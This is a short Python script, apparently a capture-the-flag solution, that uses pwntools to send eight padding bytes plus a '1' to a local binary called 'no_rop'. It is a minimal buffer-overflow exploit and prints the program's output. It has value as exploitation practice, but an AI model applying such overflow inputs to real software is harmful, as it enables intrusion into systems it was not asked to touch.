from multiprocessing import process
from pwn import *

g = 'a' * 8
msg = '1'
msgin = g + msg

p = process("./no_rop")
p.sendline(msgin)
print(f"\n\n {p.readall()}")
